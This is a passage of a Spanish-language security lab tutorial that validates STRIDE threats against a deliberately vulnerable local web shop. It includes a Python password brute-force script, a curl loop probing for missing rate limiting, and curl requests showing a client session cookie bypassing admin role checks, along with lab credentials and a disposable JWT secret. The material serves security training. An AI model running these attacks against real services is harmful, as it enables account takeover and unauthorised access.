session = requests.Session()
session.trust_env = False
session.proxies = {"http": "http://127.0.0.1:8080"}

for index, password in enumerate(passwords, start=1):
    response = session.post(
        target,
        json={"username": "cliente-brute", "password": password},
        timeout=5,
        allow_redirects=False,
    )
    print(f"{index} | HTTP {response.status_code} | Size: {len(response.content)} bytes")
    if response.status_code == 200:
        print(f"  -> Credencial aceptada en intento {index}")
        break
PYEOF
```

Ejecútalo **con Burp abierto** (el script pasa tráfico por el proxy de Burp en 8080):

```bash
./.venv-auth/bin/python /tmp/auth_bruteforce.py
```

**Resultado esperado:**

```
1 | HTTP 401 | Size: XX bytes
2 | HTTP 401 | Size: XX bytes
3 | HTTP 401 | Size: XX bytes
4 | HTTP 401 | Size: XX bytes
5 | HTTP 200 | Size: XX bytes
  -> Credencial aceptada en intento 5
```

**Punto clave:** Ninguna de las 5 peticiones fue bloqueada (no hay HTTP 429). En un sistema seguro, después de 3-5 intentos fallidos, el servidor debería responder con **429 Too Many Requests** o bloquear temporalmente la cuenta.

### Paso 2: Verificar en Burp que no hubo bloqueo

1. En Burp **Proxy** → **HTTP history**, filtra por `/api/auth/login`
2. Verás las 5 peticiones del script
3. Verifica que **ninguna** tiene código 429
4. La última (intento 5) tiene código 200 — la contraseña correcta fue aceptada sin ningún rate limit

### Paso 3: Verificar con curl rápido

Envía 10 peticiones rápidas y verifica que ninguna es bloqueada:

```bash
for i in $(seq 1 10); do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST http://127.0.0.1:5081/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username":"cliente-brute","password":"incorrecta"}')
  echo "Intento $i: HTTP $CODE"
done
```

**Resultado esperado:** Las 10 peticiones reciben HTTP 401 (no 429). Ninguna fue limitada.

### Criterio PASS/FAIL

| Resultado | Criterio |
|---|---|
| **PASS** (amenaza confirmada) | Las 5+ peticiones se procesan sin HTTP 429 ni bloqueo |
| **FAIL** (amenaza no confirmada) | El servidor responde 429 después de cierto número de intentos |

### Evidencia a capturar (screenshot)

1. Terminal: salida del script mostrando los 5 intentos sin bloqueo
2. Burp HTTP history: las 5 peticiones del script, todas con status 401 excepto la última (200)
3. Confirmación de que ninguna respuesta fue 429

---

## Amenaza E-01 — Elevation of Privilege: Cliente accede a /api/admin

### Claim del registro STRIDE

> *"La app acepta rol suministrado por cliente o token alterado."*

### Contexto

Esta amenaza tiene **dos vectores** de elevación de privilegio:

1. **Bypass con cookie MVC:** Un Cliente que inicia sesión por MVC (cookie `LabSession`) puede acceder a `/api/admin` porque en Red Team el endpoint verifica el JWT pero acepta la sesión cookie sin verificar rol.
2. **JWT forjado:** Ya demostrado en S-02 — un JWT con rol alterado a "Admin" accede a `/api/admin`.

### Paso 1: Obtener cookie MVC de Cliente A

```bash
# Login MVC — captura la cookie
COOKIE_A=$(curl -s -D - -X POST http://127.0.0.1:5081/Account/Login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "Username=cliente-a&Password=LabClienteA2026!" \
  -o /dev/null | grep -i 'set-cookie:' | grep -oP 'LabSession=[^;]+')

echo "Cookie obtenida: $COOKIE_A"
```

### Paso 2: Acceder a /api/admin con la cookie de Cliente (bypass)

```bash
curl -s -w "\nHTTP_CODE: %{http_code}\n" \
  http://127.0.0.1:5081/api/admin \
  -H "Cookie: $COOKIE_A"
```

**Resultado esperado:** HTTP 200 con datos administrativos. Un Cliente NO debería poder acceder a `/api/admin`, pero la cookie MVC bypasea la verificación de rol en Red Team.

### Paso 3: Comparar con acceso normal de Admin

```bash
# Login Admin por API (JWT)
JWT_ADMIN=$(curl -s -X POST http://127.0.0.1:5081/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin-lab","password":"LabAdmin2026!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

curl -s -w "\nHTTP_CODE: %{http_code}\n" \
  http://127.0.0.1:5081/api/admin \
  -H "Authorization: Bearer $JWT_ADMIN"
```

Ambas respuestas dan 200 — pero la primera (con cookie de Cliente) es una elevación de privilegio.

### Paso 4: Verificar que JWT de Cliente SÍ es rechazado

```bash
JWT_CLIENTE=$(curl -s -X POST http://127.0.0.1:5081/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"cliente-a","password":"LabClienteA2026!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

curl -s -w "\nHTTP_CODE: %{http_code}\n" \
  http://127.0.0.1:5081/api/admin \
  -H "Authorization: Bearer $JWT_CLIENTE"
```

**Resultado esperado:** HTTP 403. El JWT de Cliente SÍ es rechazado correctamente. La vulnerabilidad está en el bypass por cookie MVC, no en el JWT normal.

### Paso 5: En Burp Repeater — comparar los 3 escenarios

En Repeater, crea 3 peticiones `GET /api/admin`:

1. **Con Cookie de Cliente A:** → 200 (bypass, vulnerabilidad)
   ```
   GET /api/admin HTTP/1.1
   Host: 127.0.0.1:5081
   Cookie: LabSession=<COOKIE_DE_CLIENTE_A>
   ```

2. **Con JWT de Cliente A:** → 403 (correcto)
   ```
   GET /api/admin HTTP/1.1
   Host: 127.0.0.1:5081
   Authorization: Bearer <JWT_DE_CLIENTE_A>
   ```

3. **Con JWT forjado (Admin):** → 200 (vulnerabilidad de S-02)
   ```
   GET /api/admin HTTP/1.1
   Host: 127.0.0.1:5081
   Authorization: Bearer <JWT_FORJADO_ADMIN>
   ```

### Criterio PASS/FAIL

| Resultado | Criterio |
|---|---|
| **PASS** (amenaza confirmada) | Cookie de Cliente obtiene 200 en `/api/admin` Y/O JWT forjado con rol Admin obtiene 200 |
| **FAIL** (amenaza no confirmada) | Ambos vectores son rechazados (403 o 401) |

### Evidencia a capturar (screenshot)

1. Burp Repeater: `GET /api/admin` con cookie de Cliente → 200 (bypass)
2. Burp Repeater: `GET /api/admin` con JWT de Cliente → 403 (correcto)
3. Burp Repeater: `GET /api/admin` con JWT forjado → 200 (elevación)
4. Comparación visual de las 3 respuestas

---

## Tabla resumen de validación

Al completar todas las secciones, llena esta tabla con tus resultados:

| ID | Categoría | Amenaza | Resultado | Evidencia |
|---|---|---|---|---|
| S-01 | Spoofing | Enumeración de usuarios en login | ☐ PASS / ☐ FAIL | Screenshot #___ |
| S-02 | Spoofing | JWT débil → suplantación de Admin | ☐ PASS / ☐ FAIL | Screenshot #___ |
| T-01 | Tampering | SQLi blind time-based en búsqueda | ☐ PASS / ☐ FAIL | Screenshot #___ |
| T-02 | Tampering | Cliente A modifica datos de Cliente B | ☐ PASS / ☐ FAIL | Screenshot #___ |
| R-01 | Repudiation | Sin tabla de auditoría | ☐ PASS / ☐ FAIL | Screenshot #___ |
| I-01 | Info Disclosure | XSS almacenado roba cookie de sesión | ☐ PASS / ☐ FAIL | Screenshot #___ |
| I-02 | Info Disclosure | BOLA revela datos de otro cliente | ☐ PASS / ☐ FAIL | Screenshot #___ |
| I-03 | Info Disclosure | Login revela existencia de cuentas | ☐ PASS / ☐ FAIL | Screenshot #___ |
| D-01 | Denial of Service | Sin rate limit en login (Red Team) | ☐ PASS / ☐ FAIL | Screenshot #___ |
| E-01 | Elev. of Privilege | Cliente accede a /api/admin | ☐ PASS / ☐ FAIL | Screenshot #___ |

**Resultado esperado:** Las 10 amenazas deben resultar **PASS** (confirmadas). Si alguna resulta FAIL, reporta el problema al equipo para revisión.

---

## Notas finales

- **Puerto:** Este tutorial usa `5081` debido al override en `compose.override.yaml`. Si tu equipo cambia de vuelta a 5080, ajusta todos los comandos.
- **Orden:** Puedes validar las amenazas en cualquier orden, pero se recomienda seguir el orden del tutorial porque algunos pasos comparten contexto (ej: el JWT obtenido en S-02 se reutiliza en E-01).
- **Reset de la seed:** Si necesitas volver al estado inicial entre pruebas: `docker compose down && docker compose up --build -d`. Espera unos segundos a que PostgreSQL inicialice.
- **Proxy de Burp:** Para los comandos curl, si quieres que pasen por Burp añade `-x http://127.0.0.1:8080` al final. Los scripts de Python ya incluyen el proxy.
- **Guardar evidencia:** Nombra cada screenshot con el ID de la amenaza: `S-01_enum_1.png`, `S-02_jwt_forjado.png`, etc.
- **No publicar secretos:** El secreto JWT `MiniShopLab2026` es desechable y solo sirve en el laboratorio. No lo subas a repositorios públicos como si fuera real.
